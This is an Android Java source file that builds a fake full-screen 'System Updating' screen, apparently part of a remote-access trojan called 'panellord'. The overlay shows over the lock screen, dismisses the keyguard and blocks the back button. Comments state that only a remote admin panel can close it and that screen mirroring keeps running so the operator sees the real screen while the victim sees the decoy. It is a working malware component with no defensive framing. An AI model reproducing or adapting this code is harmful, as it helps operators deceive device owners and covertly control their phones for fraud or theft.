package com.panellord;

import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.app.Activity;
import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.RectF;
import android.graphics.SweepGradient;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * Full-screen "System Updating" overlay.
 *
 * - Covers entire screen (fullscreen + immersive sticky)
 * - Back button blocked — only dismissed by CommandPoller (admin panel)
 * - Screen mirror continues running so admin can see real screen
 * - Premium animation: rotating gradient ring + pulsing text + dot cycle
 */
public class BlackScreenActivity extends Activity {

    private static volatile BlackScreenActivity instance;

    public static void dismiss() {
        BlackScreenActivity a = instance;
        if (a != null && !a.isFinishing()) {
            a.runOnUiThread(a::finish);
        }
        instance = null;
    }

    public static boolean isActive() {
        BlackScreenActivity a = instance;
        return a != null && !a.isFinishing();
    }

    // ─── Animated spinner ring ──────────────────────────────────────────────

    private static class SpinnerView extends View {
        private final Paint trackPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint arcPaint   = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final RectF oval       = new RectF();
        private float startAngle = 0f;
        private final Handler h = new Handler(Looper.getMainLooper());
        private boolean running = true;

        SpinnerView(Context ctx) {
            super(ctx);
            trackPaint.setStyle(Paint.Style.STROKE);
            trackPaint.setStrokeWidth(8f);
            trackPaint.setColor(Color.parseColor("#22FFFFFF"));
            arcPaint.setStyle(Paint.Style.STROKE);
            arcPaint.setStrokeWidth(8f);
            arcPaint.setStrokeCap(Paint.Cap.ROUND);
            arcPaint.setColor(Color.parseColor("#7C3AED"));
            tick();
        }

        private void tick() {
            if (!running) return;
            startAngle = (startAngle + 4f) % 360f;
            invalidate();
            h.postDelayed(this::tick, 16);
        }

        @Override
        protected void onDraw(Canvas canvas) {
            float cx = getWidth() / 2f;
            float cy = getHeight() / 2f;
            float r  = Math.min(cx, cy) - 12f;
            oval.set(cx - r, cy - r, cx + r, cy + r);

            // Gradient sweep on arc paint
            SweepGradient sg = new SweepGradient(cx, cy,
                new int[]{
                    Color.parseColor("#7C3AED"),
                    Color.parseColor("#A855F7"),
                    Color.parseColor("#EC4899"),
                    Color.parseColor("#7C3AED")
                },
                new float[]{0f, 0.33f, 0.66f, 1f}
            );
            arcPaint.setShader(sg);

            canvas.drawOval(oval, trackPaint);
            canvas.save();
            canvas.rotate(startAngle, cx, cy);
            canvas.drawArc(oval, 0, 270, false, arcPaint);
            canvas.restore();
        }

        void stop() { running = false; h.removeCallbacksAndMessages(null); }
    }

    // ─── Activity lifecycle ─────────────────────────────────────────────────

    private SpinnerView spinnerView;
    private TextView    titleView;
    private TextView    dotView;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private int dotState = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instance = this;

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN
            | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        );

        // Dark navy background  — NOT pure black to look premium
        LinearLayout root = new LinearLayout(this);
        root.setBackgroundColor(Color.parseColor("#050714"));
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setPadding(60, 0, 60, 0);

        // Spinner
        spinnerView = new SpinnerView(this);
        LinearLayout.LayoutParams spinParams = new LinearLayout.LayoutParams(160, 160);
        spinParams.gravity = Gravity.CENTER_HORIZONTAL;
        spinParams.bottomMargin = 60;
        root.addView(spinnerView, spinParams);

        // Title "System Updating"
        titleView = new TextView(this);
        titleView.setText("System Updating");
        titleView.setTextColor(Color.parseColor("#F1F5F9"));
        titleView.setTextSize(22f);
        titleView.setGravity(Gravity.CENTER);
        titleView.setLetterSpacing(0.08f);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        titleParams.gravity = Gravity.CENTER_HORIZONTAL;
        root.addView(titleView, titleParams);

        // Animated dots
        dotView = new TextView(this);
        dotView.setText(".");
        dotView.setTextColor(Color.parseColor("#A855F7"));
        dotView.setTextSize(28f);
        dotView.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams dotParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        dotParams.gravity = Gravity.CENTER_HORIZONTAL;
        dotParams.topMargin = 8;
        root.addView(dotView, dotParams);

        // Sub-text
        TextView subText = new TextView(this);
        subText.setText("Please do not turn off your device");
        subText.setTextColor(Color.parseColor("#64748B"));
        subText.setTextSize(12f);
        subText.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams subParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        subParams.gravity = Gravity.CENTER_HORIZONTAL;
        subParams.topMargin = 32;
        root.addView(subText, subParams);

        setContentView(root);

        // Full immersive — hide status + nav bars
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            | View.SYSTEM_UI_FLAG_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        );

        // Pulse title alpha
        ObjectAnimator pulse = ObjectAnimator.ofFloat(titleView, "alpha", 1f, 0.5f);
        pulse.setDuration(1400);
        pulse.setRepeatCount(ValueAnimator.INFINITE);
        pulse.setRepeatMode(ValueAnimator.REVERSE);
        pulse.start();

        // Dot cycle animation
        tickDots();

        // NOTE: Screen mirror intentionally NOT paused —
        // admin panel continues to see real device screen while overlay is shown.
    }

    private final String[] DOTS = {".", "..", "..."};
    private void tickDots() {
        if (dotView == null) return;
        dotView.setText(DOTS[dotState % 3]);
        dotState++;
        uiHandler.postDelayed(this::tickDots, 600);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        uiHandler.removeCallbacksAndMessages(null);
        if (spinnerView != null) spinnerView.stop();
        if (instance == this) instance = null;
    }

    @Override
    public void onBackPressed() {
        // Blocked — only admin can dismiss via panel
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            );
        }
    }
}
